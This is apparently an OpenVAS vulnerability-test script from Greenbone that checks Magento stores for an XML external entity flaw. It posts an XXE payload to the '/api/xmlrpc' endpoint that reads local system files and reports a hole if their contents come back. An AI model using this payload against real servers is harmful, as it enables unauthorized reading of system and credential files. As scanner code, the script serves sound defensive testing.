###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_magento_lfi_16_07_2012.nasl 12 2013-10-27 11:15:33Z jan $
#
# Magento eCommerce Local File Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Magento eCommerce platform uses a vulnerable version of Zend framework which
is prone to XML eXternal Entity Injection attacks. The SimpleXMLElement class
of Zend framework (SimpleXML PHP extension) is used in an insecure way to
parse XML data.  External entities can be specified by adding a specific
DOCTYPE element to XML-RPC requests. By exploiting this vulnerability an
application may be coerced to open arbitrary files and/or TCP connections.";

tag_solution = "Updates are available. Please see the references for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103518";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Magento eCommerce Local File Disclosure");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://bot24.blogspot.de/2012/07/sec-consult-sa-20120712-0-magento.html");
 script_xref(name : "URL" , value : "http://www.magentocommerce.com/blog/comments/update-zend-framework-vulnerability-security-update/");
 script_xref(name : "URL" , value : "http://www.magentocommerce.com/download");
 script_xref(name : "URL" , value : "http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.0.0-1.4.1.1.patch");
 script_xref(name : "URL" , value : "http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.2.0.patch");
 script_xref(name : "URL" , value : "http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.5.0.0-1.7.0.1.patch");
 script_xref(name : "URL" , value : "https://www.magentocommerce.com/products/customer/account/index/");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-07-16 10:24:55 +0200 (Mon, 16 Jul 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read local files");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

host = get_host_name();

dirs = make_list("/magento","/shop",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {

  url = dir + '/api/xmlrpc';

  foreach file (keys(files)) {

   ex = '<?xml version="1.0"?>
     <!DOCTYPE foo [
     <!ELEMENT methodName ANY >
     <!ENTITY xxe SYSTEM "file:///' + files[file]  + '" >]>
    <methodCall>
      <methodName>&xxe;</methodName>
    </methodCall>';

    len = strlen(ex);

    req = string("POST ", url, " HTTP/1.1\r\n", 
                 "Host: ", host, "\r\n",
                 "Content-Length: ", strlen(ex), 
                 "\r\n\r\n", 
                 ex);

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(egrep(pattern:file, string:result)) {
      security_hole(port:port);
      exit(0);
    }

  }

}

